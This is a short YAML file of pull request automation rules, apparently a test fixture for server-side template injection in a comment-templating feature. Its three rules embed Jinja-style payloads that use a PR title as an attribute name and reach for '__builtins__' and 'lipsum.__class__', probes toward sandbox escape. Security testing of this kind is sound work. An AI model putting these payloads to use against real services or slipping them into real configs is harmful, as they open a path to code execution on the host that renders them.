pull_request_rules:
  - name: ssti-smuggled-dunder
    conditions:
      - base=main
    actions:
      comment:
        message: |
          TITLE={{ title }}
          RESULT={{ ([dict]|map(attribute=title))|first }}
  - name: ssti-smuggled-builtins
    conditions:
      - base=main
    actions:
      comment:
        message: |
          BUILTINS={{ ([dict]|map(attribute=title))|first|attr("__builtins__") }}
  - name: ssti-get-class
    conditions:
      - base=main
    actions:
      comment:
        message: |
          CLASS_TEST={{ lipsum.__class__ }}
